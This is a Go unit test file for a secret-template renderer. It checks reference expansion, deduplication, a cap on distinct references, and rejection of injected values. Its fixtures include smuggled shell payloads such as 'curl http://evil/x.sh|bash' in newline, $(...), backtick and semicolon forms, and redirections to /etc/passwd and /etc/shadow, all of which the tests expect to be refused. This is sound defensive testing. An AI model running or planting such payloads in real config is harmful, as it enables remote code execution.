package secrettemplate

import (
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// upper is a trivial resolver that echoes a value per ref, or errors on "missing".
// The marker is square brackets, not angle brackets: "<"/">" are now guarded shell
// redirection metacharacters (see TestRender_RejectsShellMetacharacters), so a real
// resolved value can't contain them — bracket markers keep this fixture distinguishable
// from literal template text without colliding with that guard.
func fakeResolve(ref string) (string, error) {
	if ref == "missing" {
		return "", errors.New("not found")
	}
	return "[" + ref + "]", nil
}

func TestRender_ExpandsReferences(t *testing.T) {
	out, err := Render("db=${secret:prod/db} api=${secret:prod/api}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "db=[prod/db] api=[prod/api]", out)
}

func TestRender_NoPlaceholders(t *testing.T) {
	out, err := Render("plain text, no refs, a lone $ and 100$ here", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "plain text, no refs, a lone $ and 100$ here", out)
}

func TestRender_DollarEscape(t *testing.T) {
	// "$$" collapses to "$", so "$${secret:x}" is the literal "${secret:x}".
	out, err := Render("price=$$5 and $${secret:prod/db}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "price=$5 and ${secret:prod/db}", out)
}

func TestRender_TrimsRef(t *testing.T) {
	out, err := Render("${secret:  prod/db  }", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "[prod/db]", out)
}

func TestRender_Errors(t *testing.T) {
	t.Run("unterminated", func(t *testing.T) {
		_, err := Render("oops ${secret:prod/db", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unterminated")
	})
	t.Run("empty ref", func(t *testing.T) {
		_, err := Render("${secret:}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "empty secret reference")
	})
	t.Run("resolver error names the ref", func(t *testing.T) {
		_, err := Render("x=${secret:missing}", fakeResolve)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `resolve "missing"`)
	})
}

func TestRender_AdjacentAndRepeated(t *testing.T) {
	out, err := Render("${secret:a}${secret:a}${secret:b}", fakeResolve)
	require.NoError(t, err)
	assert.Equal(t, "[a][a][b]", out)
}

func TestReferences(t *testing.T) {
	refs, err := References("${secret:prod/db} then ${secret:prod/api} then ${secret:prod/db} again")
	require.NoError(t, err)
	assert.Equal(t, []string{"prod/db", "prod/api"}, refs, "distinct, first-seen order")
}

func TestReferences_PropagatesMalformed(t *testing.T) {
	_, err := References("${secret:unterminated")
	require.Error(t, err)
}

// A secret value with no embedded control characters — the overwhelmingly common case
// — must render byte-for-byte unchanged; the new injection guard must not alter or
// reject legitimate values.
func TestRender_PlainValueUnchanged(t *testing.T) {
	resolve := func(ref string) (string, error) {
		return "S3cr3t!Value-With.Punct_And Spaces", nil
	}
	out, err := Render("DB_PASSWORD=${secret:prod/db}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "DB_PASSWORD=S3cr3t!Value-With.Punct_And Spaces", out)
}

// A secret value carrying an embedded newline, carriage return, or NUL byte must abort
// the render (matching Render's existing all-or-nothing failure model for a resolver
// error) rather than silently splicing extra lines/bytes into the output — this is the
// injection vector documented in #325: a low-trust secret-writer smuggling
// "\ncurl evil|bash\n#" into a rendered .env/config file that a downstream consumer may
// later source.
func TestRender_RejectsEmbeddedControlChars(t *testing.T) {
	cases := map[string]string{
		"newline":          "foo\ncurl http://evil/x.sh|bash\n#",
		"carriage return":  "foo\rbar",
		"crlf":             "foo\r\nbar",
		"NUL byte":         "foo\x00bar",
		"newline mid-word": "sk_live_abc\ndef",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			resolve := func(ref string) (string, error) { return val, nil }
			_, err := Render("SECRET=${secret:prod/db}", resolve)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `resolve "prod/db"`)
			assert.Contains(t, err.Error(), "cannot be safely substituted")
		})
	}
}

// A secret value carrying a shell metacharacter (backtick, ";", "|", "&", "<", ">", or a
// "$(" command-substitution opener) must abort the render, matching the newline/CR/NUL
// guard's all-or-nothing failure model. This closes the single-line variant of the
// bash-`source .env` RCE: unlike an embedded newline, none of these characters need a
// second line to take effect in an *unquoted* `KEY=value` assignment — the exact shape a
// rendered .env line takes — so the render must reject them just as eagerly.
func TestRender_RejectsShellMetacharacters(t *testing.T) {
	cases := map[string]string{
		"command substitution": "$(curl http://evil/x.sh|bash)",
		"backtick command":     "`curl http://evil/x.sh|bash`",
		"semicolon separator":  "foo; curl http://evil/x.sh|bash",
		"pipe":                 "foo|bash",
		"background ampersand": "foo & curl http://evil/x.sh|bash",
		"output redirection":   "foo>/etc/passwd",
		"input redirection":    "foo</etc/shadow",
	}
	for name, val := range cases {
		t.Run(name, func(t *testing.T) {
			resolve := func(ref string) (string, error) { return val, nil }
			_, err := Render("SECRET=${secret:prod/db}", resolve)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `resolve "prod/db"`)
			assert.Contains(t, err.Error(), "cannot be safely substituted")
		})
	}
}

// The shell-metacharacter rejection must fire per-reference too: an earlier clean
// reference followed by a later poisoned one must still fail with no partial output.
func TestRender_RejectsShellMetacharacters_NoPartialOutput(t *testing.T) {
	resolve := func(ref string) (string, error) {
		if ref == "prod/clean" {
			return "cleanvalue", nil
		}
		return "$(curl evil|bash)", nil
	}
	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
	require.Error(t, err)
	assert.Empty(t, out)
}

// A secret value that legitimately contains a lone "$" (not part of "$(") must still
// render unchanged — the guard targets command substitution and separator syntax, not
// every dollar sign, since secret values (e.g. regex patterns, prices) may contain one
// without being dangerous in a sourced .env context.
func TestRender_AllowsLoneDollarSign(t *testing.T) {
	resolve := func(ref string) (string, error) { return "price=$5.00", nil }
	out, err := Render("VALUE=${secret:prod/price}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "VALUE=price=$5.00", out)
}

// The rejection must fire per-reference: a template with an earlier clean reference and
// a later poisoned one must still fail (no partial output containing the clean value
// followed by a truncated/injected tail).
func TestRender_RejectsEmbeddedControlChars_NoPartialOutput(t *testing.T) {
	resolve := func(ref string) (string, error) {
		if ref == "prod/clean" {
			return "cleanvalue", nil
		}
		return "poison\nvalue", nil
	}
	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
	require.Error(t, err)
	assert.Empty(t, out)
}

// #443: a template that repeats the same reference many times must resolve it exactly
// once — not once per occurrence. This is both the DoS fix (a caller can't force
// N decryptions with N-1 of them wasted on byte-identical duplicates) and a
// correctness improvement (no reason to decrypt the same secret twice in one render).
func TestRender_DedupesRepeatedReferences(t *testing.T) {
	calls := map[string]int{}
	resolve := func(ref string) (string, error) {
		calls[ref]++
		return "[" + ref + "]", nil
	}

	var tmpl strings.Builder
	for i := 0; i < 5000; i++ {
		fmt.Fprintf(&tmpl, "${secret:prod/db}")
	}
	out, err := Render(tmpl.String(), resolve)
	require.NoError(t, err)

	assert.Equal(t, 1, calls["prod/db"], "resolve must be called exactly once for 5000 occurrences of the same reference")
	assert.Equal(t, strings.Repeat("[prod/db]", 5000), out, "every occurrence still substitutes the resolved value")
}

// A template naming multiple distinct references, some of which repeat, must resolve
// each distinct reference exactly once while still substituting every occurrence
// correctly (interleaved duplicates, not just adjacent ones).
func TestRender_DedupesRepeatedReferences_MultipleDistinct(t *testing.T) {
	calls := map[string]int{}
	resolve := func(ref string) (string, error) {
		calls[ref]++
		return "[" + ref + "]", nil
	}

	tmpl := strings.Repeat("${secret:a}${secret:b}${secret:a}${secret:c}${secret:b}", 200)
	out, err := Render(tmpl, resolve)
	require.NoError(t, err)

	assert.Equal(t, 1, calls["a"])
	assert.Equal(t, 1, calls["b"])
	assert.Equal(t, 1, calls["c"])
	assert.Equal(t, strings.Repeat("[a][b][a][c][b]", 200), out)
}

// #443: even after dedup, a template naming more DISTINCT references than
// MaxDistinctReferences must be rejected outright — defense in depth against a
// template naming enough distinct secrets to still be a decryption/audit-log bomb
// despite the per-reference dedup.
func TestRender_RejectsTooManyDistinctReferences(t *testing.T) {
	calls := 0
	resolve := func(ref string) (string, error) {
		calls++
		return "x", nil
	}

	var tmpl strings.Builder
	for i := 0; i < MaxDistinctReferences+1; i++ {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
	}
	out, err := Render(tmpl.String(), resolve)
	require.Error(t, err)
	assert.Empty(t, out)
	assert.Contains(t, err.Error(), fmt.Sprintf("%d", MaxDistinctReferences))
	assert.Equal(t, 0, calls, "the cap must be enforced before any resolver call, not partway through resolution")
}

// A template naming exactly MaxDistinctReferences distinct references — the boundary —
// must still be accepted and render correctly.
func TestRender_AllowsExactlyMaxDistinctReferences(t *testing.T) {
	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }

	var tmpl strings.Builder
	var want strings.Builder
	for i := 0; i < MaxDistinctReferences; i++ {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
		fmt.Fprintf(&want, "[ref-%d]", i)
	}
	out, err := Render(tmpl.String(), resolve)
	require.NoError(t, err)
	assert.Equal(t, want.String(), out)
}

// A normal, reasonably-sized template with a handful of distinct references (well
// under the cap, no duplicates) renders exactly as before this change.
func TestRender_NormalTemplateUnaffected(t *testing.T) {
	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }
	out, err := Render("host=${secret:prod/host} user=${secret:prod/user} pass=${secret:prod/pass}", resolve)
	require.NoError(t, err)
	assert.Equal(t, "host=[prod/host] user=[prod/user] pass=[prod/pass]", out)
}

// References() must respect the same distinct-reference cap as Render, since it shares
// the same parse pass.
func TestReferences_RejectsTooManyDistinctReferences(t *testing.T) {
	var tmpl strings.Builder
	for i := 0; i < MaxDistinctReferences+1; i++ {
		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
	}
	_, err := References(tmpl.String())
	require.Error(t, err)
}
